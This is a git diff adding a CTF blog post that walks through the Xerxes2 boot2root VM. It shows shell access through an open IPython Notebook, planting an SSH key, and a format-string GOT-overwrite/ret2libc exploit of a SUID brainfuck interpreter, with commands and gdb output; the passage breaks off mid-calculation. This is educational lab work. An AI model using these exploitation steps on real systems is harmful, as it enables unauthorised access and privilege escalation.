@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | #!/slash/note]]></title>
   <link href="http://leonjza.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2014-08-08T10:31:22+02:00</updated>
+  <updated>2014-08-11T09:59:56+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -12,6 +12,916 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Beating Xerxes 2 (No, Not the Persian King)]]></title>
+    <link href="http://leonjza.github.io/blog/2014/08/09/beating-xerxes2/"/>
+    <updated>2014-08-09T16:59:53+02:00</updated>
+    <id>http://leonjza.github.io/blog/2014/08/09/beating-xerxes2</id>
+    <content type="html"><![CDATA[<h2>foreword</h2>
+
+<p>Xerxes2 is a successor in a boot2root series by <a href="https://twitter.com/barrebas">@barrebas</a> hosted by <a href="https://twitter.com/vulnhub">@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>
+
+<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>
+
+<h2>getting started</h2>
+
+<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>
+
+<p>```bash nmap of 192.168.56.102 (cleaned up)
+root@kali:~# nmap -v &mdash;reason -sV 192.168.56.102 -p-</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-09 17:14 SAST
+[&hellip;]
+PORT      STATE SERVICE REASON  VERSION
+22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+80/tcp    open  http    syn-ack lighttpd 1.4.31
+111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
+4444/tcp  open  krb524? syn-ack
+8888/tcp  open  http    syn-ack Tornado httpd 2.3
+57504/tcp open  status  syn-ack 1 (RPC #100024)
+[&hellip;]
+Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds</p>
+
+<pre><code>       Raw packets sent: 131149 (5.770MB) | Rcvd: 88 (3.544KB)
+</code></pre>
+
+<p>```</p>
+
+<p>Well this gives us a boat load to test out already!</p>
+
+<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>
+
+<p>```bash String from tcp/4444
+root@kali:~#  nc 192.168.56.102 4444 | tee nc-string
+[&hellip;]
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
+AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
+^C</p>
+
+<p>root@kali:~# cat nc-string | base64 -d > nc-data
+root@kali:~# file nc-data
+nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural</p>
+
+<p>```</p>
+
+<p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and presses play.</p>
+
+<p><em>(Electronic Noises &amp; Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>
+
+<p>The start and end of the voice message had a clear in &amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>
+
+<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>
+
+<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>
+
+<h2>first shell access</h2>
+
+<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>
+
+<p><img class="<a" src="href="https://i.imgur.com/67BEjmV.png">https://i.imgur.com/67BEjmV.png</a>"></p>
+
+<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>
+
+<p>tcp/8888 hosted a <a href="http://ipython.org/notebook.html">IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>
+
+<p><img class="<a" src="href="http://i.imgur.com/JrTDTPn.png">http://i.imgur.com/JrTDTPn.png</a>"></p>
+
+<p>And then a easy SSH in:</p>
+
+<p>```bash
+root@kali:~# ssh -i delacroix <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#100;&#101;&#108;&#x61;&#99;&#x72;&#111;&#x69;&#x78;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x35;&#54;&#x2e;&#49;&#48;&#50;">&#x64;&#x65;&#x6c;&#97;&#x63;&#x72;&#111;&#x69;&#x78;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x35;&#54;&#x2e;&#49;&#x30;&#x32;</a>
+The authenticity of host &lsquo;192.168.56.102 (192.168.56.102)&rsquo; can&rsquo;t be established.
+ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added &lsquo;192.168.56.102&rsquo; (ECDSA) to the list of known hosts.</p>
+
+<p>Welcome to xerxes2.</p>
+
+<pre><code>  XERXES wishes you
+   a pleasant stay.
+</code></pre>
+
+<hr />
+
+<p><code>MM(   )P' 6MMMMb</code>MM 6MM <code>MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
+</code>MM<code>,P  6M' </code>Mb MM69 &ldquo;  <code>MM</code> ,P  6M'  <code>Mb MM'   </code> MM'  <code>Mb
+ </code>MM,P   MM    MM MM'      <code>MM,P   MM    MM YM.           ,MM
+  </code>MM.   MMMMMMMM MM        <code>MM.   MMMMMMMM  YMMMMb      ,MM'
+   d</code>MM.  MM       MM        d<code>MM.  MM           </code>Mb   ,M'  <br/>
+  d' <code>MM. YM    d9 MM       d'</code>MM. YM    d9 L    ,MM ,M'    <br/>
+<em>d</em>  <em>)MM</em> YMMMM9 <em>MM</em>    <em>d</em>  <em>)MM</em> YMMMM9  MYMMMM9  MMMMMMMM</p>
+
+<p>delacroix@xerxes2:~$
+```</p>
+
+<h2>becoming polito &ndash; the why</h2>
+
+<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>
+
+<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>
+
+<p>```bash delacroix Home and history
+delacroix@xerxes2:~$ ls -lh
+total 8.0K
+-rw-r&mdash;r&mdash; 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
+-rw-r&mdash;r&mdash; 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb</p>
+
+<p>delacroix@xerxes2:~$ history</p>
+
+<pre><code>1  cd
+2  ls -alh
+3  /opt/bf "&lt;&lt;++++[&gt;++++&lt;-]&gt;[&gt;+++++&gt;+++++&gt;+++++&gt;+++++&gt;++&gt;++++&gt;++++&gt;++++&gt;+++++&gt;++++&gt;+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;----&gt;-&gt;-&gt;-----&gt;&gt;++++&gt;+++++&gt;+++++&gt;&gt;+++++&gt;++#"
+4  cp /media/politousb/bf.c .
+5  nano bf.c
+6  exit
+7  passwd
+8  exit
+</code></pre>
+
+<p>delacroix@xerxes2:~$ /opt/bf &ldquo;&lt;&lt;++++[>++++&lt;&ndash;]>[>+++++>+++++>+++++>+++++>++>++++>++++>++++>+++++>++++>+++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&ndash;]>&mdash;&mdash;>&ndash;>&ndash;>&mdash;&mdash;&ndash;>>++++>+++++>+++++>>+++++>++#&rdquo;
+LOOK DEEPERdelacroix@xerxes2:~$
+```</p>
+
+<p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>
+
+<h3>inspecting bf.c</h3>
+
+<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>
+
+<p>```c bf.c brainfk interpreter
+case &lsquo;.&rsquo;:</p>
+
+<pre><code>printf("%c", buf[datapointer]);
+break;
+</code></pre>
+
+<p>case &lsquo;,&rsquo;:</p>
+
+<pre><code>buf[datapointer] = getchar();
+break;
+</code></pre>
+
+<p>case &lsquo;>&rsquo;:</p>
+
+<pre><code>datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
+break;
+</code></pre>
+
+<p>case &lsquo;&lt;&rsquo;:</p>
+
+<pre><code>datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
+break;
+</code></pre>
+
+<p>case &lsquo;+&rsquo;:</p>
+
+<pre><code>buf[datapointer]++;
+break;
+</code></pre>
+
+<p>case &lsquo;&ndash;&rsquo;:</p>
+
+<pre><code>buf[datapointer]--;
+</code></pre>
+
+<p>```</p>
+
+<p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>
+
+<p>That was our brainfk class for the day.</p>
+
+<h3>finding the bf vuln</h3>
+
+<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>
+
+<p>```c bf.c format string vulnerability
+case &lsquo;#&rsquo;:</p>
+
+<pre><code>// new feature
+printf(buf);
+break;
+</code></pre>
+
+<p>```</p>
+
+<p>Classic format string vulnerability!</p>
+
+<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>
+
+<h2>becoming polito &ndash; the how</h2>
+
+<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>
+
+<ul>
+<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
+<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
+<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
+<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
+<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
+<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
+<li>Profit?</li>
+</ul>
+
+
+<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>
+
+<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>
+
+<h3>/opt/bf &ndash; part1</h3>
+
+<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>
+
+<ul>
+<li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
+<li><a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
+<li><a href="http://youtu.be/NwzmYSlETI8">http://youtu.be/NwzmYSlETI8</a></li>
+<li><a href="http://youtu.be/CHrs30g-3O0">http://youtu.be/CHrs30g-3O0</a></li>
+</ul>
+
+
+<p>So, lets work with this.</p>
+
+<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>
+
+<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>
+
+<p><code>bash brainfk payload encoding (cleaned up)
+delacroix@xerxes2:~$ echo $(python -c 'print "+" * ord("a")')
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+delacroix@xerxes2:~$ /opt/bf "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#"
+a
+</code></p>
+
+<p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>
+
+<p><code>bash brainfk payload encoding multiple characters (cleanedup)
+delacroix@xerxes2:~$ /opt/bf "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#"
+aa
+</code></p>
+
+<p>2 <code>a</code>! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>
+
+<p><code>python final brainfk encoding for /opt/bf
+print "&gt;".join(["+" * ord(x) for x in ("the quick brown fox")])
+</code></p>
+
+<p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>
+
+<p>Anyways, that settled the brainfk problem.</p>
+
+<h3>/opt/bf &ndash; part2</h3>
+
+<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>
+
+<p><code>bash /opt/bf format string testing
+delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("AAAA" + ".%x" * 20 + "\n")])')#"
+AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
+</code></p>
+
+<p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>
+
+<p><code>bash /opt/bf format string direct parameter access
+delacroix@xerxes2:~$ /opt/bf "$(python -c 'print "&gt;".join(["+" * ord(x) for x in ("AAAA" + ".%16$x" "\n")])')#"
+AAAA.41414141
+</code></p>
+
+<p>Yup! Parameter 16 gives us what we need :)</p>
+
+<p>Great. Were making progress&hellip; I think.</p>
+
+<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>
+
+<h3>/opt/bf &ndash; part3</h3>
+
+<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>
+
+<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>
+
+<p><code>bash /opt/bf RW Only stack
+delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+</code></p>
+
+<p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>
+
+<p>```bash ASLR check on /opt/bf
+delacroix@xerxes2:~$ ldd /opt/bf</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb7734000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
+/lib/ld-linux.so.2 (0xb7735000)
+</code></pre>
+
+<p>delacroix@xerxes2:~$ ldd /opt/bf</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb779b000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000)
+/lib/ld-linux.so.2 (0xb779c000)
+</code></pre>
+
+<p>delacroix@xerxes2:~$ ldd /opt/bf</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0xb77c0000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000)
+/lib/ld-linux.so.2 (0xb77c1000)
+</code></pre>
+
+<p>delacroix@xerxes2:~$
+```</p>
+
+<p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>
+
+<p>```bash ASLR disable
+delacroix@xerxes2:~$ ulimit -s unlimited</p>
+
+<p>delacroix@xerxes2:~$ ldd /opt/bf</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
+/lib/ld-linux.so.2 (0x40000000)
+</code></pre>
+
+<p>delacroix@xerxes2:~$ ldd /opt/bf</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
+/lib/ld-linux.so.2 (0x40000000)
+</code></pre>
+
+<p>delacroix@xerxes2:~$ ldd /opt/bf</p>
+
+<pre><code>linux-gate.so.1 =&gt;  (0x4001e000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
+/lib/ld-linux.so.2 (0x40000000)
+</code></pre>
+
+<p>delacroix@xerxes2:~$
+```</p>
+
+<p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>
+
+<p>```bash /bin/opt GOT
+delacroix@xerxes2:~$ objdump -R /opt/bf</p>
+
+<p>/opt/bf:     file format elf32-i386</p>
+
+<p>DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049a38 R_386_GLOB_DAT    <strong>gmon_start</strong>
+08049a48 R_386_JUMP_SLOT   printf
+08049a4c R_386_JUMP_SLOT   getchar
+08049a50 R_386_JUMP_SLOT   <strong>gmon_start</strong>
+08049a54 R_386_JUMP_SLOT   exit
+08049a58 R_386_JUMP_SLOT   __libc_start_main
+08049a5c R_386_JUMP_SLOT   memset
+08049a60 R_386_JUMP_SLOT   putchar</p>
+
+<p>delacroix@xerxes2:~$
+```</p>
+
+<p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>
+
+<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>
+
+<p><code>bash libc's system
+delacroix@xerxes2:~$ gdb -q /opt/bf
+Reading symbols from /opt/bf...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /opt/bf
+usage: /opt/bf [program]
+[Inferior 1 (process 11342) exited with code 0377]
+(gdb) print system
+$1 = {&lt;text variable, no debug info&gt;} 0x40062000 &lt;system&gt;
+(gdb)
+</code></p>
+
+<p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>
+
+<h3>/opt/bf &ndash; part4</h3>
+
+<p>We have all the information we need, lets get to work.</p>
+
+<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>
+
+<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>
+
+<p>```bash
+delacroix@xerxes2:~$ gdb -q /opt/bf
+Reading symbols from /opt/bf&hellip;(no debugging symbols found)&hellip;done.</p>
+
+<p>(gdb) disass main
+Dump of assembler code for function main:
+   0x08048684 &lt;+0>: push   %ebp
+   0x08048685 &lt;+1>: mov    %esp,%ebp
+   0x08048687 &lt;+3>: and    $0xfffffff0,%esp
+   0x0804868a &lt;+6>: sub    $0x7540,%esp
+   0x08048690 &lt;+12>:    cmpl   $0x1,0x8(%ebp)
+   0x08048694 &lt;+16>:    jg     0x80486b7 &lt;main+51>
+   0x08048696 &lt;+18>:    mov    0xc(%ebp),%eax
+   0x08048699 &lt;+21>:    mov    (%eax),%eax
+   0x0804869b &lt;+23>:    mov    %eax,0x4(%esp)
+   0x0804869f &lt;+27>:    movl   $0x804887c,(%esp)
+   0x080486a6 &lt;+34>:    call   0x8048390 &lt;printf@plt>
+   0x080486ab &lt;+39>:    movl   $0xffffffff,(%esp)
+   0x080486b2 &lt;+46>:    call   0x80483c0 &lt;exit@plt>
+   0x080486b7 &lt;+51>:    movl   $0x7530,0x8(%esp)
+   0x080486bf &lt;+59>:    movl   $0x0,0x4(%esp)
+   0x080486c7 &lt;+67>:    lea    0x10(%esp),%eax
+   0x080486cb &lt;+71>:    mov    %eax,(%esp)
+   0x080486ce &lt;+74>:    call   0x80483e0 &lt;memset@plt>
+   0x080486d3 &lt;+79>:    mov    0xc(%ebp),%eax
+   0x080486d6 &lt;+82>:    add    $0x4,%eax
+   0x080486d9 &lt;+85>:    mov    (%eax),%eax
+   0x080486db &lt;+87>:    lea    0x10(%esp),%edx
+   0x080486df &lt;+91>:    mov    %edx,0x4(%esp)
+   0x080486e3 &lt;+95>:    mov    %eax,(%esp)
+   0x080486e6 &lt;+98>:    call   0x80484ec <bf>
+   0x080486eb &lt;+103>:   movl   $0x0,(%esp) # &lt;&mdash; we will break here
+   0x080486f2 &lt;+110>:   call   0x80483c0 &lt;exit@plt>
+End of assembler dump.</p>
+
+<p>(gdb) break *0x080486eb
+Breakpoint 1 at 0x80486eb</p>
+
+<p>(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%16$n&rdquo;)])&rsquo;)#&ldquo;
+Starting program: /opt/bf &rdquo;$(python -c &lsquo;print &ldquo;>&rdquo;.join([&ldquo;+&rdquo; * ord(x) for x in (&ldquo;\x48\x9a\x04\x08&rdquo; + &ldquo;%16$n&rdquo;)])&rsquo;)#"</p>
+
+<p>Breakpoint 1, 0x080486eb in main ()</p>
+
+<p>(gdb) x/x 0x08049a48
+0x8049a48 <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#112;&#x72;&#105;&#110;&#116;&#x66;&#x40;&#x67;&#111;&#x74;&#46;&#112;&#x6c;&#116;">&#x70;&#x72;&#x69;&#x6e;&#x74;&#102;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#x6c;&#x74;</a>: 0x00000004
+(gdb)
+```</p>
+
+<p>Oooooooooooh. So basically 0x8049a48 now sais <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>
+
+<p><code>bash Calculating the first offset
+(gdb) shell echo $(python -c 'print 0x2000-0x4')
+8188 # output is a decimal value
+</code></p>
+
+<p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>
+
+<p>```bash first padded string
+(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%8188u%16$n&rdquo;)])&rsquo;)#&ldquo;
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y</p>
+
+<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;%8188u%16$n&rdquo;)])&rsquo;)#&ldquo;
+H�                                                                                                                                                                                                               <br/>
+Breakpoint 1, 0x080486eb in main ()
+(gdb) x/x 0x08049a48
+0x8049a48 <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x70;&#114;&#105;&#x6e;&#116;&#102;&#x40;&#103;&#x6f;&#x74;&#x2e;&#112;&#x6c;&#116;">&#x70;&#x72;&#x69;&#x6e;&#116;&#x66;&#x40;&#103;&#111;&#116;&#x2e;&#112;&#108;&#116;</a>: 0x00002000
+(gdb)
+```</p>
+
+<p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>
+
+<p>```bash writing upper part of memory and offset change
+(gdb) run &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8188u%16$n&rdquo; + &ldquo;%17$n&rdquo;)])&rsquo;)#&ldquo;
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y</p>
+
+<p>Starting program: /opt/bf &ldquo;$(python -c &lsquo;print &rdquo;>&ldquo;.join([&rdquo;+&ldquo; * ord(x) for x in (&rdquo;\x48\x9a\x04\x08" + &ldquo;\x4a\x9a\x04\x08&rdquo; + &ldquo;%8188u%16$n&rdquo; + &ldquo;%17$n&rdquo;)])&rsquo;)#&ldquo;
+H�J�                                                                                                                                                                                                              3
+Breakpoint 1, 0x080486eb in main ()
+(gdb) x/x 0x08049a48
+0x8049a48 <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x70;&#114;&#105;&#110;&#x74;&#102;&#x40;&#103;&#x6f;&#116;&#x2e;&#112;&#x6c;&#116;">&#112;&#114;&#105;&#x6e;&#116;&#102;&#64;&#103;&#x6f;&#x74;&#x2e;&#112;&#x6c;&#116;</a>: 0x20042004
+(gdb)
+```</p>
+
+<p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>
+
+<p>```bash calculating the upper part and fixing the offset
+(gdb) shell echo $(python -c &lsquo;print 0x4006-0x2000&rsquo;)
+8198 # output is a decimal value</p>
+
